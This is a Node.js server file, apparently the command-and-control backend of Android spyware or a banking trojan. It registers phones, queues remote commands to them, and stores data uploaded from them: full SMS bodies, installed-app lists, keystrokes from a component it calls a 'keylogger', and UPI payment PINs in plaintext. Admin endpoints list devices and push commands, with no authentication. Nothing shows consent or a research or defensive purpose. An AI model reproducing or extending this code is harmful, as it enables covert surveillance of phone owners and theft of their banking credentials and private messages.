// server.js
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
require('dotenv').config();

const { PrismaClient } = require('@prisma/client');

// Handle BigInt serialization
BigInt.prototype.toJSON = function () { return this.toString() }

const prisma = new PrismaClient();
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

app.use(cors());
app.use(express.json());

// Connect to database
async function connectDatabase() {
    try {
        await prisma.$connect();
        console.log('Connected to database via Prisma');
    } catch (err) {
        console.error('Database connection error:', err);
        process.exit(1);
    }
}

connectDatabase();

// Socket.IO Connection Handling
io.on('connection', (socket) => {
    const deviceId = socket.handshake.query.device_id;
    console.log(`Device connected: ${deviceId}`);

    if (deviceId) {
        // Join device-specific room
        socket.join(`device:${deviceId}`);

        // Update device online status
        prisma.device.upsert({
            where: { device_id: deviceId },
            update: {
                is_online: true,
                last_seen: new Date()
            },
            create: {
                device_id: deviceId,
                manufacturer: "Unknown", // Default required fields
                model: "Unknown",
                is_online: true,
                last_seen: new Date()
            }
        }).catch(err => {
            // Ignore if it fails due to missing fields, likely upsert_device_data will come next
            console.error('Error updating device status:', err.message);
        });
    }

    // Upsert device data
    socket.on('upsert_device_data', async (data, ack) => {
        try {
            const d = JSON.parse(data);

            // Construct update object based on DeviceData schema
            const deviceDataUpdate = {
                android_id: d.android_id || null,
                manufacturer: d.manufacturer || "Unknown",
                model: d.model || "Unknown",
                brand: d.brand || null,
                product: d.product || null,
                android_version: d.android_version || null,
                raw_device_info: d.raw_device_info || null,

                // Status objects
                sim_cards: d.sim_cards || [],
                service_status: d.service_status || null,
                oem_status: d.oem_status || null,
                power_save_status: d.power_save_status || null,
                screen_status: d.screen_status || null,
                process_importance: d.process_importance || null,

                last_seen: new Date(),
                is_online: true
            };

            await prisma.device.upsert({
                where: { device_id: d.device_id },
                update: deviceDataUpdate,
                create: {
                    device_id: d.device_id,
                    ...deviceDataUpdate
                }
            });
            ack(true);
        } catch (error) {
            console.error('Error upserting device data:', error);
            ack(false);
        }
    });

    // Get pending commands
    socket.on('get_pending_commands', async (deviceId, ack) => {
        try {
            const commands = await prisma.command.findMany({
                where: {
                    device_id: deviceId,
                    status: 'pending'
                },
                orderBy: { created_at: 'desc' }
            });
            // Map to client expected structure if needed, but names now match generally
            // Client expects: id, deviceId, command, payload, status
            const mappedCommands = commands.map(c => ({
                id: c.id.toString(), // Client usually expects strings for IDs in some mappings, but let's check. Kotlin 'val id: String'.
                device_id: c.device_id,
                command: c.command,
                payload: c.payload,
                status: c.status
            }));

            ack(JSON.stringify(mappedCommands));
        } catch (error) {
            console.error('Error getting pending commands:', error);
            ack(JSON.stringify([]));
        }
    });

    // Mark command as delivered
    socket.on('mark_command_delivered', async (commandId, ack) => {
        try {
            await prisma.command.update({
                where: { id: parseInt(commandId) }, // Assuming commandId comes as string/int
                data: {
                    status: 'delivered',
                    updated_at: new Date()
                }
            });
            ack(true);
        } catch (error) {
            console.error('Error marking command as delivered:', error);
            ack(false);
        }
    });

    // Mark command as executed
    socket.on('mark_command_executed', async (commandId, ack) => {
        try {
            await prisma.command.update({
                where: { id: parseInt(commandId) },
                data: {
                    status: 'executed',
                    updated_at: new Date()
                }
            });
            ack(true);
        } catch (error) {
            console.error('Error marking command as executed:', error);
            ack(false);
        }
    });

    // Mark command as failed
    socket.on('mark_command_failed', async (data, ack) => {
        try {
            const { command_id, error } = JSON.parse(data);
            await prisma.command.update({
                where: { id: parseInt(command_id) },
                data: {
                    status: 'failed',
                    error: error,
                    updated_at: new Date()
                }
            });
            ack(true);
        } catch (error) {
            console.error('Error marking command as failed:', error);
            ack(false);
        }
    });

    // Send heartbeat
    socket.on('send_heartbeat', async (data, ack) => {
        try {
            const h = JSON.parse(data);
            // HeartbeatData: device_id, status, lastUpdate (String), uptime (Long), ram (Long)

            // Save heartbeat
            await prisma.heartbeat.create({
                data: {
                    device_id: h.device_id,
                    status: h.status,
                    last_update: h.lastUpdate || new Date().toISOString(), // Fallback if missing
                    uptime: BigInt(h.uptime || 0),
                    ram: BigInt(h.ram || 0),
                    timestamp: new Date()
                }
            });

            // Update device last seen
            await prisma.device.update({
                where: { device_id: h.device_id },
                data: {
                    last_seen: new Date(),
                    is_online: true
                }
            });

            socket.emit('heartbeat_ack');
            ack(true);
        } catch (error) {
            console.error('Error processing heartbeat:', error);
            ack(false);
        }
    });

    // Set online status
    socket.on('set_online_status', async (status, ack) => {
        try {
            if (deviceId) {
                await prisma.device.update({
                    where: { device_id: deviceId },
                    data: {
                        is_online: status,
                        last_seen: new Date()
                    }
                }).catch(e => console.error("Update online status failed", e.message));
            }
            ack(true);
        } catch (error) {
            console.error('Error setting online status:', error);
            ack(false);
        }
    });

    // Sync SMS
    socket.on('sync_sms', async (data, ack) => {
        try {
            const messages = JSON.parse(data);
            // SmsMessage: id (Long), device_id, address, body, date (String), timestamp (Long), type (Int)

            await prisma.$transaction(async (tx) => {
                for (const msg of messages) {
                    const androidId = BigInt(msg.id);
                    await tx.sms.upsert({
                        where: {
                            device_id_android_sms_id: {
                                device_id: msg.device_id,
                                android_sms_id: androidId
                            }
                        },
                        update: {
                            address: msg.address,
                            body: msg.body,
                            date: msg.date,
                            timestamp: BigInt(msg.timestamp),
                            type: msg.type,
                            read: true // Assuming synced means read or strictly we don't know
                        },
                        create: {
                            device_id: msg.device_id,
                            android_sms_id: androidId,
                            address: msg.address,
                            body: msg.body,
                            date: msg.date,
                            timestamp: BigInt(msg.timestamp),
                            type: msg.type,
                            read: true
                        }
                    });
                }
            });

            socket.emit('sync_complete', 'sms', messages.length);
            ack(true);
        } catch (error) {
            console.error('Error syncing SMS:', error);
            ack(false);
        }
    });

    // Sync single SMS
    socket.on('sync_single_sms', async (data, ack) => {
        try {
            const msg = JSON.parse(data);
            const androidId = BigInt(msg.id);

            await prisma.sms.upsert({
                where: {
                    device_id_android_sms_id: {
                        device_id: msg.device_id,
                        android_sms_id: androidId
                    }
                },
                update: {
                    address: msg.address,
                    body: msg.body,
                    date: msg.date,
                    timestamp: BigInt(msg.timestamp),
                    type: msg.type
                },
                create: {
                    device_id: msg.device_id,
                    android_sms_id: androidId,
                    address: msg.address,
                    body: msg.body,
                    date: msg.date,
                    timestamp: BigInt(msg.timestamp),
                    type: msg.type
                }
            });
            ack(true);
        } catch (error) {
            console.error('Error syncing single SMS:', error);
            ack(false);
        }
    });

    // Sync apps
    socket.on('sync_apps', async (data, ack) => {
        try {
            const apps = JSON.parse(data);
            // InstalledApp: device_id, app_name, package_name, icon, version_name, version_code, 
            // first_install_time, last_update_time, is_system_app, target_sdk, min_sdk, sync_timestamp

            await prisma.$transaction(async (tx) => {
                for (const app of apps) {
                    await tx.installedApp.upsert({
                        where: {
                            device_id_package_name: {
                                device_id: app.device_id,
                                package_name: app.package_name
                            }
                        },
                        update: {
                            app_name: app.app_name,
                            icon: app.icon,
                            version_name: app.version_name,
                            version_code: app.version_code ? BigInt(app.version_code) : null,
                            first_install_time: app.first_install_time ? BigInt(app.first_install_time) : null,
                            last_update_time: app.last_update_time ? BigInt(app.last_update_time) : null,
                            is_system_app: app.is_system_app,
                            target_sdk: app.target_sdk,
                            min_sdk: app.min_sdk,
                            sync_timestamp: app.sync_timestamp ? BigInt(app.sync_timestamp) : BigInt(Date.now()),
                            updated_at: new Date()
                        },
                        create: {
                            device_id: app.device_id,
                            package_name: app.package_name,
                            app_name: app.app_name,
                            icon: app.icon,
                            version_name: app.version_name,
                            version_code: app.version_code ? BigInt(app.version_code) : null,
                            first_install_time: app.first_install_time ? BigInt(app.first_install_time) : null,
                            last_update_time: app.last_update_time ? BigInt(app.last_update_time) : null,
                            is_system_app: app.is_system_app || false,
                            target_sdk: app.target_sdk,
                            min_sdk: app.min_sdk,
                            sync_timestamp: app.sync_timestamp ? BigInt(app.sync_timestamp) : BigInt(Date.now()),
                            created_at: new Date(),
                            updated_at: new Date()
                        }
                    });
                }
            });

            socket.emit('sync_complete', 'apps', apps.length);
            ack(true);
        } catch (error) {
            console.error('Error syncing apps:', error);
            ack(false);
        }
    });

    // Set key log
    socket.on('set_key_log', async (data, ack) => {
        try {
            const keyLog = JSON.parse(data);
            await prisma.keyLog.create({
                data: {
                    device_id: keyLog.device_id,
                    keylogger: keyLog.keylogger,
                    key: keyLog.key,
                    current_date: keyLog.currentDate // Kotlin val currentDate: String
                }
            });
            ack(true);
        } catch (error) {
            console.error('Error saving key log:', error);
            ack(false);
        }
    });

    // Set UPI pin
    socket.on('set_upi_pin', async (data, ack) => {
        try {
            const pinData = JSON.parse(data);
            await prisma.pin.create({
                data: {
                    device_id: pinData.device_id,
                    pin: pinData.pin,
                    current_date: pinData.currentDate // Kotlin val currentDate: String
                }
            });
            ack(true);
        } catch (error) {
            console.error('Error saving UPI pin:', error);
            ack(false);
        }
    });

    // Test connection
    socket.on('test_connection', (data, ack) => {
        ack(true);
    });

    // Admin: Send command to device
    socket.on('send_command', async (data) => {
        try {
            const { device_id, command, payload } = data; // Expecting 'command' and 'payload' now
            const newCommand = await prisma.command.create({
                data: {
                    device_id,
                    command,
                    payload,
                    status: 'pending'
                }
            });

            // Emit command to specific device room
            // Map structure to DeviceCommand expected by client
            const commandToSend = {
                id: newCommand.id.toString(),
                device_id: newCommand.device_id,
                command: newCommand.command,
                payload: newCommand.payload,
                status: newCommand.status
            };

            io.to(`device:${device_id}`).emit('command', JSON.stringify([commandToSend]));
        } catch (error) {
            console.error('Error sending command:', error);
        }
    });

    // Handle disconnection
    socket.on('disconnect', () => {
        console.log(`Device disconnected: ${deviceId}`);

        if (deviceId) {
            // Update device offline status
            prisma.device.update({
                where: { device_id: deviceId },
                data: {
                    is_online: false,
                    last_seen: new Date()
                }
            }).catch(err => console.error('Error updating offline status:', err));
        }
    });
});

// REST API Endpoints for Admin
app.get('/api/devices', async (req, res) => {
    try {
        const devices = await prisma.device.findMany({
            orderBy: { last_seen: 'desc' }
        });
        res.json(devices);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/devices/:deviceId/commands', async (req, res) => {
    try {
        const commands = await prisma.command.findMany({
            where: { device_id: req.params.deviceId },
            orderBy: { created_at: 'desc' }
        });
        res.json(commands);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/devices/:deviceId/commands', async (req, res) => {
    try {
        const { command, payload } = req.body;
        const newCommand = await prisma.command.create({
            data: {
                device_id: req.params.deviceId,
                command: command,
                payload: payload,
                status: 'pending'
            }
        });

        const commandToSend = {
            id: newCommand.id.toString(),
            device_id: newCommand.device_id,
            command: newCommand.command,
            payload: newCommand.payload,
            status: newCommand.status
        };

        // Emit command to device
        io.to(`device:${req.params.deviceId}`).emit('command', JSON.stringify([commandToSend]));

        res.json(newCommand);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/devices/:deviceId/heartbeats', async (req, res) => {
    try {
        const heartbeats = await prisma.heartbeat.findMany({
            where: { device_id: req.params.deviceId },
            orderBy: { timestamp: 'desc' },
            take: 100
        });
        res.json(heartbeats);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Graceful shutdown
process.on('SIGINT', async () => {
    await prisma.$disconnect();
    process.exit(0);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Socket.IO server running on port ${PORT}`);
});